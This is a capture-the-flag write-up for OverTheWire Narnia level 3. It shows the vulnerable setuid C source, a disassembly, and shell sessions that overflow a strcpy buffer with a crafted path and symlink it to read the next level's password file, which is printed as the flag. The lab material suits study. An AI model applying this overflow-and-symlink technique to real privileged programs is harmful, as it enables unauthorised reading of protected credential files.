# Narnia Level 2 → Level 3 Symlink Exploitation

## Previous Flag
<b>2xszzNl6uG</b>

## Goal
Use previous password to log in SSH with user <b>narnia3</b> and port <b>2226</b> accessed on narnia.labs.overthewire.org.

There is no information for this level, intentionally.

## What I learned
```
$ find /usr/include/x86_64-linux-gnu/ -name types.h ⌨️
/usr/include/x86_64-linux-gnu/bits/types.h
/usr/include/x86_64-linux-gnu/sys/types.h
/usr/include/x86_64-linux-gnu/asm/types.h

#include <sys/types.h>          https://www.man7.org/linux/man-pages/man0/sys_types.h.0p.html
                                less /usr/include/x86_64-linux-gnu/sys/types.h ⌨️
#include <sys/stat.h>           https://man7.org/linux/man-pages/man0/sys_stat.h.0p.html
                                less /usr/include/x86_64-linux-gnu/sys/stat.h ⌨️
#include <fcntl.h>              https://www.man7.org/linux/man-pages/man0/fcntl.h.0p.html
                                less /usr/include/x86_64-linux-gnu/sys/fcntl.h ⌨️
#include <unistd.h>             https://www.man7.org/linux/man-pages/man0/unistd.h.0p.html
                                less /usr/include/x86_64-linux-gnu/sys/unistd.h ⌨️

Can use python3 -c in CLI
Use printf instead of echo when possible for scripting

File paths:
    Instead of ../../../narnia
        /narnia/ ❤️

Instead of $(echo)
    `echo`                      # backticks do the same in shell
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh narnia3@narnia.labs.overthewire.org -p 2226 ⌨️
narnia3@narnia:~$ cd /narnia/ ⌨️
narnia3@narnia:/narnia$ file narnia3 ⌨️
narnia3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a549159036712b3354b5a68bb41a079fdffcdc85, for GNU/Linux 3.2.0, not stripped
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
    int  ifd,  ofd;
    char ofile[16] = "/dev/null";                           # lower memory override will change directory of output
    char ifile[32];                                         # higher memory variable will override lower 🐱‍💻
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);                                 # Vulnerability Here
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
narnia3@narnia:/narnia$ ./narnia3 ⌨️
usage, ./narnia3 file, will send contents of file 2 /dev/null
narnia3@narnia:/narnia$ ./narnia3 narnia3.c ⌨️
copied contents of narnia3.c to a safer place... (/dev/null)

# Method 1: bash
narnia3@narnia:~$ cd /tmp/ ⌨️
narnia3@narnia:/tmp$ mkdir -p /tmp/asdfasdfasdfasdfasdfasdfasd/tmp/ ⌨️
narnia3@narnia:/tmp$ ln -s /etc/narnia_pass/narnia4 /tmp/asdfasdfasdfasdfasdfasdfasd/tmp/hacker ⌨️
narnia3@narnia:/tmp$ ls -la ⌨️
ls: cannot open directory '.': Permission denied

# Output File
narnia3@narnia:/tmp$ touch hacker ⌨️
narnia3@narnia:/tmp$ chmod 777 hacker ⌨️

# Give argument w/ 32 characters + /tmp destination
narnia3@narnia:/tmp$ /narnia/narnia3 /tmp/asdfasdfasdfasdfasdfasdfasd/tmp/hacker ⌨️
copied contents of /tmp/asdfasdfasdfasdfasdfasdfasd/tmp/hacker to a safer place... (/tmp/hacker)
narnia3@narnia:/tmp$ cat /tmp/hacker ⌨️
iqNWNk173q 🔐

# Method 2: Using Optional: objdump and python3
# Buffer takes 32 char
# /tmp/ takes up 5 char already
narnia3@narnia:~$ cd /tmp/ ⌨️
narnia3@narnia:/tmp$ python3 -c "print(len('/tmp/' + 'A'*27))" ⌨️
32
narnia3@narnia:/tmp$ mkdir -p $(python3 -c "print ('/tmp/' + 'A'*27 + '/tmp')") ⌨️
narnia3@narnia:/tmp$ cd $(python3 -c "print ('/tmp/' + 'A'*27 + '/tmp')") ⌨️

# Pass current directory with `pwd`, Note: backticks
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ /narnia/narnia3 `pwd`/abc ⌨️❤️
error opening /tmp/abc 
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ /narnia/narnia3 $(pwd)/abc ⌨️
error opening /tmp/abc

# Optional: Dissassemble binary w/ objdump
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ objdump -d -M intel ../../../narnia/narnia3 ⌨️

../../../narnia/narnia3:     file format elf32-i386


Disassembly of section .init:

08049000 <_init>:
 8049000:       53                      push   ebx
 8049001:       83 ec 08                sub    esp,0x8
 8049004:       e8 f7 00 00 00          call   8049100 <__x86.get_pc_thunk.bx>
 8049009:       81 c3 37 22 00 00       add    ebx,0x2237
 804900f:       8b 83 fc ff ff ff       mov    eax,DWORD PTR [ebx-0x4]
 8049015:       85 c0                   test   eax,eax
 8049017:       74 02                   je     804901b <_init+0x1b>
 8049019:       ff d0                   call   eax
 804901b:       83 c4 08                add    esp,0x8
 804901e:       5b                      pop    ebx
 804901f:       c3                      ret

Disassembly of section .plt:

08049020 <__libc_start_main@plt-0x10>:
 8049020:       ff 35 44 b2 04 08       push   DWORD PTR ds:0x804b244
 8049026:       ff 25 48 b2 04 08       jmp    DWORD PTR ds:0x804b248
 804902c:       00 00                   add    BYTE PTR [eax],al
        ...

08049030 <__libc_start_main@plt>:
 8049030:       ff 25 4c b2 04 08       jmp    DWORD PTR ds:0x804b24c
 8049036:       68 00 00 00 00          push   0x0
 804903b:       e9 e0 ff ff ff          jmp    8049020 <_init+0x20>

08049040 <read@plt>:
 8049040:       ff 25 50 b2 04 08       jmp    DWORD PTR ds:0x804b250
 8049046:       68 08 00 00 00          push   0x8
 804904b:       e9 d0 ff ff ff          jmp    8049020 <_init+0x20>

08049050 <printf@plt>:
 8049050:       ff 25 54 b2 04 08       jmp    DWORD PTR ds:0x804b254
 8049056:       68 10 00 00 00          push   0x10
 804905b:       e9 c0 ff ff ff          jmp    8049020 <_init+0x20>

08049060 <strcpy@plt>:
 8049060:       ff 25 58 b2 04 08       jmp    DWORD PTR ds:0x804b258
 8049066:       68 18 00 00 00          push   0x18
 804906b:       e9 b0 ff ff ff          jmp    8049020 <_init+0x20>

08049070 <exit@plt>:
 8049070:       ff 25 5c b2 04 08       jmp    DWORD PTR ds:0x804b25c
 8049076:       68 20 00 00 00          push   0x20
 804907b:       e9 a0 ff ff ff          jmp    8049020 <_init+0x20>

08049080 <open@plt>:
 8049080:       ff 25 60 b2 04 08       jmp    DWORD PTR ds:0x804b260
 8049086:       68 28 00 00 00          push   0x28
 804908b:       e9 90 ff ff ff          jmp    8049020 <_init+0x20>

08049090 <write@plt>:
 8049090:       ff 25 64 b2 04 08       jmp    DWORD PTR ds:0x804b264
 8049096:       68 30 00 00 00          push   0x30
 804909b:       e9 80 ff ff ff          jmp    8049020 <_init+0x20>

080490a0 <close@plt>:
 80490a0:       ff 25 68 b2 04 08       jmp    DWORD PTR ds:0x804b268
 80490a6:       68 38 00 00 00          push   0x38
 80490ab:       e9 70 ff ff ff          jmp    8049020 <_init+0x20>

Disassembly of section .text:

080490b0 <_start>:
 80490b0:       31 ed                   xor    ebp,ebp
 80490b2:       5e                      pop    esi
 80490b3:       89 e1                   mov    ecx,esp
 80490b5:       83 e4 f0                and    esp,0xfffffff0
 80490b8:       50                      push   eax
 80490b9:       54                      push   esp
 80490ba:       52                      push   edx
 80490bb:       e8 19 00 00 00          call   80490d9 <_start+0x29>
 80490c0:       81 c3 80 21 00 00       add    ebx,0x2180
 80490c6:       6a 00                   push   0x0
 80490c8:       6a 00                   push   0x0
 80490ca:       51                      push   ecx
 80490cb:       56                      push   esi
 80490cc:       8d 83 9d de ff ff       lea    eax,[ebx-0x2163]
 80490d2:       50                      push   eax
 80490d3:       e8 58 ff ff ff          call   8049030 <__libc_start_main@plt>
 80490d8:       f4                      hlt
 80490d9:       8b 1c 24                mov    ebx,DWORD PTR [esp]
 80490dc:       c3                      ret

080490dd <__wrap_main>:
 80490dd:       e9 e4 00 00 00          jmp    80491c6 <main>
 80490e2:       66 90                   xchg   ax,ax
 80490e4:       66 90                   xchg   ax,ax
 80490e6:       66 90                   xchg   ax,ax
 80490e8:       66 90                   xchg   ax,ax
 80490ea:       66 90                   xchg   ax,ax
 80490ec:       66 90                   xchg   ax,ax
 80490ee:       66 90                   xchg   ax,ax

080490f0 <_dl_relocate_static_pie>:
 80490f0:       c3                      ret
 80490f1:       66 90                   xchg   ax,ax
 80490f3:       66 90                   xchg   ax,ax
 80490f5:       66 90                   xchg   ax,ax
 80490f7:       66 90                   xchg   ax,ax
 80490f9:       66 90                   xchg   ax,ax
 80490fb:       66 90                   xchg   ax,ax
 80490fd:       66 90                   xchg   ax,ax
 80490ff:       90                      nop

08049100 <__x86.get_pc_thunk.bx>:
 8049100:       8b 1c 24                mov    ebx,DWORD PTR [esp]
 8049103:       c3                      ret
 8049104:       66 90                   xchg   ax,ax
 8049106:       66 90                   xchg   ax,ax
 8049108:       66 90                   xchg   ax,ax
 804910a:       66 90                   xchg   ax,ax
 804910c:       66 90                   xchg   ax,ax
 804910e:       66 90                   xchg   ax,ax

08049110 <deregister_tm_clones>:
 8049110:       b8 74 b2 04 08          mov    eax,0x804b274
 8049115:       3d 74 b2 04 08          cmp    eax,0x804b274
 804911a:       74 24                   je     8049140 <deregister_tm_clones+0x30>
 804911c:       b8 00 00 00 00          mov    eax,0x0
 8049121:       85 c0                   test   eax,eax
 8049123:       74 1b                   je     8049140 <deregister_tm_clones+0x30>
 8049125:       55                      push   ebp
 8049126:       89 e5                   mov    ebp,esp
 8049128:       83 ec 14                sub    esp,0x14
 804912b:       68 74 b2 04 08          push   0x804b274
 8049130:       ff d0                   call   eax
 8049132:       83 c4 10                add    esp,0x10
 8049135:       c9                      leave
 8049136:       c3                      ret
 8049137:       2e 8d b4 26 00 00 00    lea    esi,cs:[esi+eiz*1+0x0]
 804913e:       00
 804913f:       90                      nop
 8049140:       c3                      ret
 8049141:       2e 8d b4 26 00 00 00    lea    esi,cs:[esi+eiz*1+0x0]
 8049148:       00
 8049149:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]

08049150 <register_tm_clones>:
 8049150:       b8 74 b2 04 08          mov    eax,0x804b274
 8049155:       2d 74 b2 04 08          sub    eax,0x804b274
 804915a:       89 c2                   mov    edx,eax
 804915c:       c1 e8 1f                shr    eax,0x1f
 804915f:       c1 fa 02                sar    edx,0x2
 8049162:       01 d0                   add    eax,edx
 8049164:       d1 f8                   sar    eax,1
 8049166:       74 20                   je     8049188 <register_tm_clones+0x38>
 8049168:       ba 00 00 00 00          mov    edx,0x0
 804916d:       85 d2                   test   edx,edx
 804916f:       74 17                   je     8049188 <register_tm_clones+0x38>
 8049171:       55                      push   ebp
 8049172:       89 e5                   mov    ebp,esp
 8049174:       83 ec 10                sub    esp,0x10
 8049177:       50                      push   eax
 8049178:       68 74 b2 04 08          push   0x804b274
 804917d:       ff d2                   call   edx
 804917f:       83 c4 10                add    esp,0x10
 8049182:       c9                      leave
 8049183:       c3                      ret
 8049184:       8d 74 26 00             lea    esi,[esi+eiz*1+0x0]
 8049188:       c3                      ret
 8049189:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]

08049190 <__do_global_dtors_aux>:
 8049190:       f3 0f 1e fb             endbr32
 8049194:       80 3d 74 b2 04 08 00    cmp    BYTE PTR ds:0x804b274,0x0
 804919b:       75 1b                   jne    80491b8 <__do_global_dtors_aux+0x28>
 804919d:       55                      push   ebp
 804919e:       89 e5                   mov    ebp,esp
 80491a0:       83 ec 08                sub    esp,0x8
 80491a3:       e8 68 ff ff ff          call   8049110 <deregister_tm_clones>
 80491a8:       c6 05 74 b2 04 08 01    mov    BYTE PTR ds:0x804b274,0x1
 80491af:       c9                      leave
 80491b0:       c3                      ret
 80491b1:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]
 80491b8:       c3                      ret
 80491b9:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]

080491c0 <frame_dummy>:
 80491c0:       f3 0f 1e fb             endbr32
 80491c4:       eb 8a                   jmp    8049150 <register_tm_clones>

080491c6 <main>: 👀
 80491c6:       55                      push   ebp                              # create base pointer
 80491c7:       89 e5                   mov    ebp,esp                          # set stack pointer to base pointer
 80491c9:       83 ec 58                sub    esp,0x58
 80491cc:       c7 45 e8 2f 64 65 76    mov    DWORD PTR [ebp-0x18],0x7665642f 
 80491d3:       c7 45 ec 2f 6e 75 6c    mov    DWORD PTR [ebp-0x14],0x6c756e2f 
 80491da:       c7 45 f0 6c 00 00 00    mov    DWORD PTR [ebp-0x10],0x6c       
 80491e1:       c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0         
 80491e8:       83 7d 08 02             cmp    DWORD PTR [ebp+0x8],0x2
 80491ec:       74 1a                   je     8049208 <main+0x42>
 80491ee:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80491f1:       8b 00                   mov    eax,DWORD PTR [eax]
 80491f3:       50                      push   eax
 80491f4:       68 08 a0 04 08          push   0x804a008
 80491f9:       e8 52 fe ff ff          call   8049050 <printf@plt>
 80491fe:       83 c4 08                add    esp,0x8
 8049201:       6a ff                   push   0xffffffff
 8049203:       e8 68 fe ff ff          call   8049070 <exit@plt>
 8049208:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804920b:       83 c0 04                add    eax,0x4
 804920e:       8b 00                   mov    eax,DWORD PTR [eax]
 8049210:       50                      push   eax
 8049211:       8d 45 c8                lea    eax,[ebp-0x38]
 8049214:       50                      push   eax
 8049215:       e8 46 fe ff ff          call   8049060 <strcpy@plt>
 804921a:       83 c4 08                add    esp,0x8
 804921d:       6a 02                   push   0x2
 804921f:       8d 45 e8                lea    eax,[ebp-0x18]
 8049222:       50                      push   eax
 8049223:       e8 58 fe ff ff          call   8049080 <open@plt>
 8049228:       83 c4 08                add    esp,0x8
 804922b:       89 45 fc                mov    DWORD PTR [ebp-0x4],eax
 804922e:       83 7d fc 00             cmp    DWORD PTR [ebp-0x4],0x0
 8049232:       79 18                   jns    804924c <main+0x86>
 8049234:       8d 45 e8                lea    eax,[ebp-0x18]
 8049237:       50                      push   eax
 8049238:       68 40 a0 04 08          push   0x804a040
 804923d:       e8 0e fe ff ff          call   8049050 <printf@plt>
 8049242:       83 c4 08                add    esp,0x8
 8049245:       6a ff                   push   0xffffffff
 8049247:       e8 24 fe ff ff          call   8049070 <exit@plt>
 804924c:       6a 00                   push   0x0
 804924e:       8d 45 c8                lea    eax,[ebp-0x38]
 8049251:       50                      push   eax
 8049252:       e8 29 fe ff ff          call   8049080 <open@plt>
 8049257:       83 c4 08                add    esp,0x8
 804925a:       89 45 f8                mov    DWORD PTR [ebp-0x8],eax
 804925d:       83 7d f8 00             cmp    DWORD PTR [ebp-0x8],0x0
 8049261:       79 18                   jns    804927b <main+0xb5>
 8049263:       8d 45 c8                lea    eax,[ebp-0x38]
 8049266:       50                      push   eax
 8049267:       68 40 a0 04 08          push   0x804a040
 804926c:       e8 df fd ff ff          call   8049050 <printf@plt>
 8049271:       83 c4 08                add    esp,0x8
 8049274:       6a ff                   push   0xffffffff
 8049276:       e8 f5 fd ff ff          call   8049070 <exit@plt>
 804927b:       6a 1f                   push   0x1f
 804927d:       8d 45 a8                lea    eax,[ebp-0x58]
 8049280:       50                      push   eax
 8049281:       ff 75 f8                push   DWORD PTR [ebp-0x8]
 8049284:       e8 b7 fd ff ff          call   8049040 <read@plt>
 8049289:       83 c4 0c                add    esp,0xc
 804928c:       6a 1f                   push   0x1f
 804928e:       8d 45 a8                lea    eax,[ebp-0x58]
 8049291:       50                      push   eax
 8049292:       ff 75 fc                push   DWORD PTR [ebp-0x4]
 8049295:       e8 f6 fd ff ff          call   8049090 <write@plt>
 804929a:       83 c4 0c                add    esp,0xc
 804929d:       8d 45 e8                lea    eax,[ebp-0x18]
 80492a0:       50                      push   eax
 80492a1:       8d 45 c8                lea    eax,[ebp-0x38]
 80492a4:       50                      push   eax
 80492a5:       68 54 a0 04 08          push   0x804a054
 80492aa:       e8 a1 fd ff ff          call   8049050 <printf@plt>
 80492af:       83 c4 0c                add    esp,0xc
 80492b2:       ff 75 f8                push   DWORD PTR [ebp-0x8]
 80492b5:       e8 e6 fd ff ff          call   80490a0 <close@plt>
 80492ba:       83 c4 04                add    esp,0x4
 80492bd:       ff 75 fc                push   DWORD PTR [ebp-0x4]
 80492c0:       e8 db fd ff ff          call   80490a0 <close@plt>
 80492c5:       83 c4 04                add    esp,0x4
 80492c8:       6a 01                   push   0x1
 80492ca:       e8 a1 fd ff ff          call   8049070 <exit@plt>

Disassembly of section .fini:

080492d0 <_fini>:
 80492d0:       53                      push   ebx
 80492d1:       83 ec 08                sub    esp,0x8
 80492d4:       e8 27 fe ff ff          call   8049100 <__x86.get_pc_thunk.bx>
 80492d9:       81 c3 67 1f 00 00       add    ebx,0x1f67
 80492df:       83 c4 08                add    esp,0x8
 80492e2:       5b                      pop    ebx
 80492e3:       c3                      ret

narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ln -s /etc/narnia_pass/narnia4 hacker ⌨️
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ls -la ⌨️
total 8
drwxrwxr-x 2 narnia3 narnia3 4096 Aug 13 21:32 .
drwxrwxr-x 3 narnia3 narnia3 4096 Aug 13 21:19 ..
lrwxrwxrwx 1 narnia3 narnia3   24 Aug 13 21:32 hacker -> /etc/narnia_pass/narnia4
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ touch /tmp/output ⌨️
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ touch /tmp/hacker ⌨️
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ chmod 777 /tmp/hacker ⌨️
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hacker ⌨️
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hacker to a safer place... (/tmp/hacker)
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ cat /tmp/hacker ⌨️
iqNWNk173q 🔐
pup
```

## Flag
<b>iqNWNk173q</b>

## Continue
[Continue](./Narnia0304.md)